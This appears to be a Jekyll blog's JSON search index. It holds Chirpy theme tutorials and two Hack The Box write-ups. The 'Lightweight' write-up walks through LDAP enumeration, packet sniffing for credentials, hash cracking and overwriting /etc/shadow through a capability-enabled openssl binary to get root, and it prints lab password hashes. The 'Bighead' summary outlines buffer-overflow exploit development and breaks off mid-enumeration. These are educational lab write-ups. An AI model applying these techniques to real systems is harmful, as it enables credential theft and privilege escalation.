‚ïê‚ï£‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïùFile upload done.Updating service [default]...done.Setting traffic split for service [default]...done.Deployed service [default] to [https://chirpy-test-XXXX.ue.r.appspot.com]You can stream logs from the command line by running:$ gcloud app logs tail -s defaultTo view your application in the web browser run:$ gcloud app browse            Visit the deployed service. Add a /admin to the end of the URL.        Click on Authorize Users and make sure to add yourself as a managed user.        If you get any errors, please Google it. The errors are self-explanatory and should be easy to fix.  If everything went good, you‚Äôll get this screen:Create Google Analytics QueryHead to https://PROJECT_ID.REGION_ID.r.appspot.com/admin and create a query after verifying the account. GA Core Reporting API query request can be created in Query Explorer.The query parameters are as follows:  start-date: fill in the first day of blog posting  end-date: fill in today (this is a parameter supported by GA Report, which means that it will always end according to the current query date)  metrics: select ga:pageviews  dimensions: select ga:pagePathIn order to reduce the returned results and reduce the network bandwidth, we add custom filtering rules 1:      filters: fill in ga:pagePath=~^/posts/.*/$;ga:pagePath!@=.    Among them, ; means using logical AND to concatenate two rules.    If the site.baseurl is specified, change the first filtering rule to ga:pagePath=~^/BASE_URL/posts/.*/$, where BASE_URL is the value of site.baseurl.  After Run Query, copy the generated contents of API Query URI at the bottom of the page and fill in the Encoded URI for the query of SuperProxy on GAE.After the query is saved on GAE, a Public Endpoint (public access address) will be generated, and we will get the query result in JSON format when accessing it. Finally, click Enable Endpoint in Public Request Endpoint to make the query effective, and click Start Scheduling in Scheduling to start the scheduled task.Configure Chirpy to Display Page ViewOnce all the hard part is done, it is very easy to enable the Page View on Chirpy theme. Your superProxy dashboard should look something like below and you can grab the required values.Update the _config.yml file of Chirpy project with the values from your dashboard, to look similar to the following:google_analytics:  id: 'G-V6XXXXXXX'   # fill in your Google Analytics ID  pv:    proxy_endpoint: 'https://PROJECT_ID.REGION_ID.r.appspot.com/query?id=&lt;ID FROM SUPER PROXY&gt;'    cache_path:       # the local PV cache data, friendly to visitors from GFW regionNow, you should see the Page View enabled on your blog.Reference            Google Analytics Core Reporting API: Filters¬†&#8617;      "
  },
  
  {
    "title": "Customize the Favicon",
    "url": "/posts/customize-the-favicon/",
    "categories": "Blogging, Tutorial",
    "tags": "favicon",
    "date": "2019-08-11 00:34:00 +0800",
    





    
    "snippet": "The favicons of Chirpy are placed in the directory assets/img/favicons/. You may want to replace them with your own. The following sections will guide you to create and replace the default favicons...",
    "content": "The favicons of Chirpy are placed in the directory assets/img/favicons/. You may want to replace them with your own. The following sections will guide you to create and replace the default favicons.Generate the faviconPrepare a square image (PNG, JPG, or SVG) with a size of 512x512 or more, and then go to the online tool Real Favicon Generator and click the button Select your Favicon image to upload your image file.In the next step, the webpage will show all usage scenarios. You can keep the default options, scroll to the bottom of the page, and click the button Generate your Favicons and HTML code to generate the favicon.Download &amp; ReplaceDownload the generated package, unzip and delete the following two from the extracted files:  browserconfig.xml  site.webmanifestAnd then copy the remaining image files (.PNG and .ICO) to cover the original files in the directory assets/img/favicons/ of your Jekyll site. If your Jekyll site doesn‚Äôt have this directory yet, just create one.The following table will help you understand the changes to the favicon files:            File(s)      From Online Tool      From Chirpy                  *.PNG      ‚úì      ‚úó              *.ICO      ‚úì      ‚úó        ‚úì means keep, ‚úó means delete.The next time you build the site, the favicon will be replaced with a customized edition."
  },
  
  {
    "title": "Writing a New Post",
    "url": "/posts/write-a-new-post/",
    "categories": "Blogging, Tutorial",
    "tags": "writing",
    "date": "2019-08-08 14:10:00 +0800",
    





    
    "snippet": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be...",
    "content": "This post will guide you how to write a post on Chirpy theme. Even if you have previous experience with Jekyll, this article is worth reading, because many features require specific variables to be set.Naming and PathCreate a new file named YYYY-MM-DD-TITLE.EXTENSION and put it in the _posts of the root directory. Please note that the EXTENSION must be one of md and markdown. If you want to save time of creating files, please consider using the plugin Jekyll-Compose to accomplish this.Front MatterBasically, you need to fill the Front Matter as below at the top of the post:---title: TITLEdate: YYYY-MM-DD HH:MM:SS +/-TTTTcategories: [TOP_CATEGORIE, SUB_CATEGORIE]tags: [TAG]     # TAG names should always be lowercase---  The posts‚Äô layout has been set to post by default, so there is no need to add the variable layout in the Front Matter block.Timezone of DateIn order to accurately record the release date of a post, you should not only set up the timezone of _config.yml but also provide the post‚Äôs timezone in variable date of its Front Matter block. Format: +/-TTTT, e.g. +0800.Categories and TagsThe categories of each post are designed to contain up to two elements, and the number of elements in tags can be zero to infinity. For instance:---categories: [Animal, Insect]tags: [bee]---Author InformationThe author information of the post usually does not need to be filled in the Front Matter , they will be obtained from variables social.name and the first entry of social.links of the configuration file by default. But you can also override it as follows:Adding author information in _data/authors.yml (If your website doesn‚Äôt have this file, don‚Äôt hesitate to create one).&lt;author_id&gt;:  name: &lt;full name&gt;  twitter: &lt;twitter_of_author&gt;  url: &lt;homepage_of_author&gt;And then use author to specify a single entry or authors to specify multiple entries:---author: &lt;author_id&gt;                     # for single entry# orauthors: [&lt;author1_id&gt;, &lt;author2_id&gt;]   # for multiple entries---Having said that, the key author can also identify multiple entries.  The benefit of reading the author information from the file _data/authors.yml is that the page will have the meta tag twitter:creator, which enriches the Twitter Cards and is good for SEO.Table of ContentsBy default, the Table of Contents (TOC) is displayed on the right panel of the post. If you want to turn it off globally, go to _config.yml and set the value of variable toc to false. If you want to turn off TOC for a specific post, add the following to the post‚Äôs Front Matter:---toc: false---CommentsThe global switch of comments is defined by variable comments.active in the file _config.yml. After selecting a comment system for this variable, comments will be turned on for all posts.If you want to close the comment for a specific post, add the following to the Front Matter of the post:---comments: false---MathematicsFor website performance reasons, the mathematical feature won‚Äôt be loaded by default. But it can be enabled by:---math: true---MermaidMermaid is a great diagrams generation tool. To enable it on your post, add the following to the YAML block:---mermaid: true---Then you can use it like other markdown languages: surround the graph code with ```mermaid and ```.ImagesCaptionAdd italics to the next line of an imageÔºåthen it will become the caption and appear at the bottom of the image:![img-description](/path/to/image)_Image Caption_SizeIn order to prevent the page content layout from shifting when the image is loaded, we should set the width and height for each image:![Desktop View](/assets/img/sample/mockup.png){: width=\"700\" height=\"400\" }Starting from Chirpy v5.0.0, height and width support abbreviations (height ‚Üí h, width ‚Üí w). The following example has the same effect as the above:![Desktop View](/assets/img/sample/mockup.png){: w=\"700\" h=\"400\" }PositionBy default, the image is centered, but you can specify the position by using one of the classes normal, left, and right.  Once the position is specified, the image caption should not be added.      Normal position    Image will be left aligned in below sample:    ![Desktop View](/assets/img/sample/mockup.png){: .normal }            Float to the left    ![Desktop View](/assets/img/sample/mockup.png){: .left }            Float to the right    ![Desktop View](/assets/img/sample/mockup.png){: .right }      ShadowThe screenshots of the program window can be considered to show the shadow effect, and the shadow will be visible in the light mode:![Desktop View](/assets/img/sample/mockup.png){: .shadow }CDN URLIf you host the images on the CDN, you can save the time of repeatedly writing the CDN URL by assigning the variable img_cdn of _config.yml file:img_cdn: https://cdn.comOnce img_cdn is assigned, the CDN URL will be added to the path of all images (images of site avatar and posts) starting with /.For instance, when using images:![The flower](/path/to/flower.png)The parsing result will automatically add the CDN prefix https://cdn.com before the image path:&lt;img src=\"https://cdn.com/path/to/flower.png\" alt=\"The flower\"&gt;Image PathWhen a post contains many images, it will be a time-consuming task to repeatedly define the path of the images. To solve this, we can define this path in the YAML block of the post:---img_path: /img/path/---And then, the image source of Markdown can write the file name directly:![The flower](flower.png)The output will be:&lt;img src=\"/img/path/flower.png\" alt=\"The flower\"&gt;Preview ImageIf you want to add an image to the top of the post contents, specify the attribute path, width, height, and alt for the image:---image:  path: /path/to/image  width: 1000   # in pixels  height: 400   # in pixels  alt: image alternative text---Except for alt, all other options are necessary, especially the width and height, which are related to user experience and web page loading performance. The above section ‚ÄúSize‚Äù also mentions this.Starting from Chirpy v5.0.0, the attributes height and width can be abbreviated: height ‚Üí h, width ‚Üí w. In addition, the img_path can also be passed to the preview image, that is, when it has been set, the  attribute path only needs the image file name.For simple use, you can also just use image to define the path.image: /path/to/imagePinned PostsYou can pin one or more posts to the top of the home page, and the fixed posts are sorted in reverse order according to their release date. Enable by:---pin: true---PromptsThere are several types of prompts: tip, info, warning, and danger. They can be generated by adding the class prompt-{type} to the blockquote. For example, define a prompt of type info as follows:&gt; Example line for prompt.{: .prompt-info }SyntaxInline Code`inline code part`Filepath Hightlight`/path/to/a/file.extend`{: .filepath}Code BlockMarkdown symbols ``` can easily create a code block as follows:```This is a plaintext code snippet.```Specifying LanguageUsing ```{language} you will get a code block with syntax highlight:```yamlkey: value```  The Jekyll tag {% highlight %} is not compatible with this theme.Line NumberBy default, all languages except plaintext, console, and terminal will display line numbers. When you want to hide the line number of a code block, add the class nolineno to it:```shellecho 'No more line numbers!'```{: .nolineno }Specifying the FilenameYou may have noticed that the code language will be displayed at the top of the code block. If you want to replace it with the file name, you can add the attribute file to achieve this:```shell# content```{: file=\"path/to/file\" }Liquid CodesIf you want to display the Liquid snippet, surround the liquid code with {% raw %} and {% endraw %}:{% raw %}```liquid{% if product.title contains 'Pack' %}  This product's title contains the word Pack.{% endif %}```{% endraw %}Or adding render_with_liquid: false (Requires Jekyll 4.0 or higher) to the post‚Äôs YAML block.Learn MoreFor more knowledge about Jekyll posts, visit the Jekyll Docs: Posts."
  },
  
  {
    "title": "Text and Typography",
    "url": "/posts/text-and-typography/",
    "categories": "Blogging, Demo",
    "tags": "typography",
    "date": "2019-08-08 11:33:00 +0800",
    





    
    "snippet": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let‚Äôs start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 ...",
    "content": "This post is to show Markdown syntax rendering on Chirpy, you can also use it as an example of writing. Now, let‚Äôs start looking at text and typography.TitlesH1 - headingH2 - headingH3 - headingH4 - headingParagraphQuisque egestas convallis ipsum, ut sollicitudin risus tincidunt a. Maecenas interdum malesuada egestas. Duis consectetur porta risus, sit amet vulputate urna facilisis ac. Phasellus semper dui non purus ultrices sodales. Aliquam ante lorem, ornare a feugiat ac, finibus nec mauris. Vivamus ut tristique nisi. Sed vel leo vulputate, efficitur risus non, posuere mi. Nullam tincidunt bibendum rutrum. Proin commodo ornare sapien. Vivamus interdum diam sed sapien blandit, sit amet aliquam risus mattis. Nullam arcu turpis, mollis quis laoreet at, placerat id nibh. Suspendisse venenatis eros eros.ListsOrdered list  Firstly  Secondly  ThirdlyUnordered list  Chapter          Section                  Paragraph                    ToDo list  Job          Step 1      Step 2      Step 3      Description list  Sun  the star around which the earth orbits  Moon  the natural satellite of the earth, visible by reflected light from the sunBlock Quote  This line shows the block quote.Prompts  An example showing the tip type prompt.  An example showing the info type prompt.  An example showing the warning type prompt.  An example showing the danger type prompt.Tables            Company      Contact      Country                  Alfreds Futterkiste      Maria Anders      Germany              Island Trading      Helen Bennett      UK              Magazzini Alimentari Riuniti      Giovanni Rovelli      Italy      Linkshttp://127.0.0.1:4000FootnoteClick the hook will locate the footnote1, and here is another footnote2.Images  Default (with caption)Full screen width and center alignment  Shadowshadow effect (visible in light mode)  Left aligned      Float to left    Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum. Phasellus a tortor aliquam, tristique felis sit amet, elementum enim. Integer vestibulum vitae nulla nec pretium.        Float to right    Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum. Phasellus a tortor aliquam, tristique felis sit amet, elementum enim. Integer vestibulum vitae nulla nec pretium.  Mermaid SVG gantt  title  Adding GANTT diagram functionality to mermaid  apple :a, 2017-07-20, 1w  banana :crit, b, 2017-07-23, 1d  cherry :active, c, after b a, 1dMathematicsThe mathematics powered by MathJax:\\[\\sum_{n=1}^\\infty 1/n^2 = \\frac{\\pi^2}{6}\\]When $a \\ne 0$, there are two solutions to $ax^2 + bx + c = 0$ and they are\\[x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}\\]Inline codeThis is an example of Inline Code.FilepathHere is the /path/to/the/file.extend.Code blockCommonThis is a common code snippet, without syntax highlight and line number.Specific LanguagesConsole$ env |grep SHELLSHELL=/usr/local/bin/bashPYENV_SHELL=bashShellif [ $? -ne 0 ]; then    echo \"The command was not successful.\";    #do the needful / exitfi;Specific filename@import  \"colors/light-typography\",  \"colors/dark-typography\"Reverse Footnote            The footnote source¬†&#8617;              The 2nd footnote source¬†&#8617;      "
  },
  
  {
    "title": "Lightweight - Hack The Box",
    "url": "/posts/htb-writeup-lightweight/",
    "categories": "hackthebox, infosec",
    "tags": "john, ldap, caps, tcpdump, password cracking",
    "date": "2019-05-11 00:00:00 +0800",
    





    
    "snippet": "Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in t...",
    "content": "Lightweight was a fun box that uses Linux capabilities set on tcpdump so we can capture packets on the loopback interface and find credentials in an LDAP session. We then find more credentials in the source code of the web application and finally priv esc to root by abusing a copy of the openssl program that all has Linux caps set on it.Summary  The main web page contains instructions on how to access the box by SSH (basically an account is automatically created based on the user‚Äôs IP address)  The status.php page does an LDAP query to the loopback interface, which can be intercepted since tcpdump is running with elevated caps  The LDAP query contains the credentials for user ldapuser2  User ldapuser2 has access to the PHP source code for the web application, which has credentials for user ldapuser1  There is an openssl binary in the home directory of ldapuser1 with elevated caps that let us read/write any files on the systemPortscanWe got SSH, Apache httpd and OpenLDAP runnning on this box.root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.119Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-10 23:27 ESTNmap scan report for 10.10.10.119Host is up (0.024s latency).Not shown: 65532 filtered portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: |   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16|_http-title: Lightweight slider evaluation page - slendr389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X| ssl-cert: Subject: commonName=lightweight.htb| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain| Not valid before: 2018-06-09T13:32:51|_Not valid after:  2019-06-09T13:32:51|_ssl-date: TLS randomness does not represent timeWeb pageThere‚Äôs not much on the webpage except some instructions on how to login via SSH, how to reset the user password and a status check page.One thing to note is the status page always take a long time to execute so there is probably some script running in the background.As per the instruction, we can log in with our IP as username / password:# ssh -l 10.10.14.23 10.10.10.11910.10.14.23@10.10.10.119's password: [10.10.14.23@lightweight ~]$ iduid=1004(10.10.14.23) gid=1004(10.10.14.23) groups=1004(10.10.14.23) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023LDAP enumThe LDAP server allows any user to search the directory and does not require authentication:# ldapsearch -h 10.10.10.119 -b \"dc=lightweight,dc=htb\" -x# ldapuser1, People, lightweight.htbdn: uid=ldapuser1,ou=People,dc=lightweight,dc=htbuid: ldapuser1cn: ldapuser1sn: ldapuser1mail: ldapuser1@lightweight.htbobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQvshadowLastChange: 17691shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 1000gidNumber: 1000homeDirectory: /home/ldapuser1# ldapuser2, People, lightweight.htbdn: uid=ldapuser2,ou=People,dc=lightweight,dc=htbuid: ldapuser2cn: ldapuser2sn: ldapuser2mail: ldapuser2@lightweight.htbobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: topobjectClass: shadowAccountuserPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24xshadowLastChange: 17691shadowMin: 0shadowMax: 99999shadowWarning: 7loginShell: /bin/bashuidNumber: 1001gidNumber: 1001homeDirectory: /home/ldapuser2We can see two sets of credentials here. These are actually Base64 encoded versions of the Linux SHA512 hashes.First hash decodes to: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/None of the hashes could be cracked using rockyou.txt, so we have to get the password some other way.Checking capsI checked the entire filesystem for any files running with elevated capabilities. Capabilities are used when a program need some kind of privilege that would normally require root access. With caps, we can give specific privileges to the binary without making the file suid or running it directly as root.[10.10.14.23@lightweight ~]$ getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_admin,cap_net_raw+p/usr/sbin/mtr = cap_net_raw+ep/usr/sbin/suexec = cap_setgid,cap_setuid+ep/usr/sbin/arping = cap_net_raw+p/usr/sbin/clockdiff = cap_net_raw+p/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+epHere, tcpdump has some caps set to allow a regular user to capture traffic on any interface.As per http://man7.org/linux/man-pages/man7/capabilities.7.html, the exact description of the caps are:CAP_NET_ADMIN    Perform various network-related operations:    * interface configuration;    * administration of IP firewall, masquerading, and accounting;    * modify routing tables;    * bind to any address for transparent proxying;    * set type-of-service (TOS)    * clear driver statistics;    * set promiscuous mode;    * enabling multicasting;CAP_NET_RAW    * Use RAW and PACKET sockets;    * bind to any address for transparent proxying.Capturing trafficThere is an automated script on the box that connects locally to the LDAP server via the loopback interface. Because it‚Äôs not using LDAPS, the credentials are in plaintext and I can capture them by sniffing the loopback interface.[10.10.14.23@lightweight ~]$ tcpdump -nni lo -w /tmp/capture.pcaptcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytesAfter grabbing the .pcap file via scp, we can see the following LDAP query using simple authentication with user ldapuser2And we‚Äôve got the password in plaintext here:ldapuser2 password is: 8bc8251332abe1d7f105d3e53ad39ac2Logging in as ldapuser2 and grabbing the user flagWe can‚Äôt SSH in as ldapuser2 but we‚Äôre able to su to ldapuser2.[10.10.14.23@lightweight ~]$ su -l ldapuser2Password: Last login: Mon Dec 10 21:41:37 GMT 2018 on pts/1Last failed login: Tue Dec 11 04:35:22 GMT 2018 from 10.10.14.23 on ssh:nottyThere was 1 failed login attempt since the last successful login.[ldapuser2@lightweight ~]$ lsbackup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt[ldapuser2@lightweight ~]$ cat user.txt8a866d...Privesc to ldapuser1The backup.7z file in ldapuser2‚Äôs home directory is our next logical target, however it has a password set on it:# 7z e backup.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)Scanning the drive for archives:1 file, 3411 bytes (4 KiB)Extracting archive: backup.7z--Path = backup.7zType = 7zPhysical Size = 3411Headers Size = 259Method = LZMA2:12k 7zAESSolid = +Blocks = 1    Enter password (will not be echoed):I‚Äôll use 7z2john to extract the hash then crack it with john:root@ragingunicorn:~/JohnTheRipper/run# ./7z2john.pl /root/tmp/backup.7z backup.7z:$7z$2$19$0$$8$11e96[...]# ~/JohnTheRipper/run/john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])Cost 1 (iteration count) is 524288 for all loaded hashesCost 2 (padding size) is 12 for all loaded hashesCost 3 (compression type) is 2 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdelete           (?)1g 0:00:00:40 DONE (2018-12-10 23:59) 0.02448g/s 50.53p/s 50.53c/s 50.53C/s poison..nokiaUse the \"--show\" option to display all of the cracked passwords reliablySession completedPassword is : delete# 7z x -obackup backup.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21[...]Size:       10270Compressed: 3411root@ragingunicorn:~/tmp# ls -l backuptotal 24-rw-r----- 1 root root 4218 Jun 13 14:48 index.php-rw-r----- 1 root root 1764 Jun 13 14:47 info.php-rw-r----- 1 root root  360 Jun 10  2018 reset.php-rw-r----- 1 root root 2400 Jun 14 15:06 status.php-rw-r----- 1 root root 1528 Jun 13 14:47 user.phpWe have a backup of the web application source code and status.php contains credentials:$username = 'ldapuser1';$password = 'f3ca9d298a553da117442deeb6fa932d';We can then su to ldapuser1 with that password:[10.10.14.23@lightweight ~]$ su -l ldapuser1Password: Last login: Tue Dec 11 02:01:07 GMT 2018 on pts/1[ldapuser1@lightweight ~]$ ls capture.pcap  ldapTLS.php  openssl  tcpdumpFinal privescChecking caps again, we see the openssl binary in the current directory has caps set:[ldapuser1@lightweight ~]$ getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_admin,cap_net_raw+p/usr/sbin/mtr = cap_net_raw+ep/usr/sbin/suexec = cap_setgid,cap_setuid+ep/usr/sbin/arping = cap_net_raw+p/usr/sbin/clockdiff = cap_net_raw+p/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep/home/ldapuser1/openssl =epThe =ep caps means the all capabilities are assigned to the file. We can read /etc/shadow with openssl by encrypting it to a file in our home directory, then decrypting it:-256-cbc encryption password:Verifying - enter aes-256-cbc encryption password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out shadowenter aes-256-cbc decryption password:[ldapuser1@lightweight ~]$ cat shadowroot:$6$eVOz8tJs$xpjymy5BFFeCIHq9a.BoKZeyPReKd7pwoXnxFNOa7TP5ltNmSDsiyuS/ZqTgAGNEbx5jyZpCnbf8xIJ0Po6N8.:17711:0:99999:7:::[...]ldapuser1:$6$OZfv1n9[v$2gh4EFIrLW5hZEEzrVn4i8bYfXMyiPp2450odPwiL5yGOHYksVd8dCTqeDt3ffgmwmRYw49c]MFueNZNOoI6A1.:17691:365:99999:7:::ldapuser2:$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1:17691:365:99999:7:::10.10.14.2:clJFBL7EDs1H6:17851:0:99999:7:::10.10.14.13:qehr2qxjyEzkw:17874:0:99999:7:::10.10.14.26:syd74YenpBuf6:17875:0:99999:7:::10.10.14.12:pdfLwDAqvvWI2:17876:0:99999:7:::10.10.14.23:owYEfkaBVoeFI:17876:0:99999:7:::We probably can‚Äôt crack the root hash because the HTB boxes typically have a very complex password for the root account but we can replace the shadow file with an empty root password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -a -salt -in shadow -out shadow.encenter aes-256-cbc encryption password:Verifying - enter aes-256-cbc encryption password:[ldapuser1@lightweight ~]$ ./openssl aes-256-cbc -d -a -in shadow.enc -out /etc/shadowenter aes-256-cbc decryption password:[ldapuser1@lightweight ~]$ su -l rootLast login: Thu Dec  6 14:09:41 GMT 2018 on tty1[root@lightweight ~]# iduid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023[root@lightweight ~]# cat root.txtf1d4e3..."
  },
  
  {
    "title": "Bighead - Hack The Box",
    "url": "/posts/htb-writeup-bighead/",
    "categories": "hackthebox, infosec",
    "tags": "exploit development, egghunter, asm, nginx, php, keepass, lfi, ntfs ads, enumeration, insane, windows",
    "date": "2019-05-04 00:00:00 +0800",
    





    
    "snippet": "Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We t...",
    "content": "Bighead was an extremely difficult box by 3mrgnc3 that starts with website enumeration to find two sub-domains and determine there is a custom webserver software running behind an Nginx proxy. We then need to exploit a buffer overflow in the HEAD requests by creating a custom exploit. After getting a shell, there‚Äôs some pivoting involved to access a limited SSH server, then an LFI to finally get a shell as SYSTEM. For the final stretch there is an NTFS alternate data stream with a Keepass file that contains the final flag.This box took the big part of my weekend when it came out but unfortunately I didn‚Äôt keep detailed notes about everything. It was especially hard going back when doing this writeup and remember about the 418 status code and the registry key for the SSH password. Note to self: Always clean-up my notes after doing a box.The exploit part is especially tricky since there isn‚Äôt a lot of buffer space to work with so I had to put my second stage payload in memory first with a POST request then use an egghunter for the first stage payload. There‚Äôs also another way to exploit this software without using an egghunter: We can use the LoadLibrary function to remotely load a .dll from our machine over SMB. I‚Äôll try to cover both in this blog post.Summary  Find the code.bighead.htb sub-domain after dirbusting the main website  Enumerate code.bighead.htb, find reference to dev.bighead.htb in one of the note file  Find the BigheadWebSvr 1.0 webserver running by checking the coffee directory  Search github and find that we can download the source code for the BigheadWebSvr webserver  Analyse the binary and determine that it is vulnerable to a buffer overflow in HEAD requests  Develop a working exploit locally on a 32 bits Windows 7 machine  Adapt the exploit so it works through the Nginx reverse proxy  Get a working reverse shell with the exploit and a metepreter payload  Find a local SSH service listening on port 2020 then set up port forwarding to reach it  Find the nginx SSH credentials by looking in the registry then log in to bvshell  Find an LFI vulnerability in the Testlink application then use it to get a shell as NT AUTHORITY\\SYSTEM  Get the user.txt flag and find that the root.txt is accessible but contains a troll  Notice that Keepass is installed and that the configuration file contains a keyfile name and database file of root.txt  Find that there is an NTFS alternate data stream in the root.txt file that contains the hidden Keepass database file  Download the admin.png keyfile, extract the hidden stream, extract the hash from the database file and crack it with John The Ripper  Open the Keepass database file with the keyfile and password, then recover the root.txt hash from the databaseTools used  Immunity Debugger &amp; x96dbg  Metasploit  keepass2john  John The RipperPortscanThere‚Äôs a single port open and Nginx is listening on it:# nmap -sC -sV -p- 10.10.10.112Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-28 21:03 EDTNmap scan report for bighead.htb (10.10.10.112)Host is up (0.0076s latency).Not shown: 65534 filtered portsPORT   STATE SERVICE VERSION80/tcp open  http    nginx 1.14.0|_http-server-header: nginx/1.14.0|_http-title: PiperNet ComesWebsite enumeration: bighead.htbThe main website is a company front page with a contact form at the bottom.I tried checking the contact form for any stored XSS but I couldn‚Äôt find any.A quick scan with gobuster reveals interesting directories: /backend and /updatecheck# gobuster -q -w /usr/share/wordlists/dirb/big.txt -t 50 -u http://bighead.htb/.htpasswd (Status: 403)/.htaccess (Status: 403)/Images (Status: 301)/assets (Status: 301)/backend (Status: 302)/images (Status: 301)/updatecheck (Status: 302)backend simply redirects to http://bighead.htb/BigHead and returns a 404 error.However /updatecheck redirects to http://code.bighead.htb/phpmyadmin/phpinfo.php, so I‚Äôll add that sub-domain to the list of stuff to enumerate.After adding the sub-domain I can get to the page and it returns a phpinfo() output.I know the box is running Windows Server 2008 and that it‚Äôs 32 bits.Website enumeration: code.bighead.htbIf I try to browse http://code.bighead.htb/ I‚Äôm redirected to http://code.bighead.htb/testlink/ which has another javascript redirect script to http://127.0.0.1:5080/testlink/.Further enumeration with gobuster:# gobuster -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 25 -u http://code.bighead.htb | grep -vi index2018/11/24 14:54:15 Starting gobuster/images (Status: 301)/img (Status: 301)/assets (Status: 301)/mail (Status: 301)/dev (Status: 301)/phpmyadmin (Status: 301)/webalizer (Status: 301)/dashboard (Status: 301)/xampp (Status: 301)/licenses (Status: 301)/server-status (Status: 200)/con (Status: 403)/aux (Status: 403)/error_log (Status: 403)/prn (Status: 403)/server-info 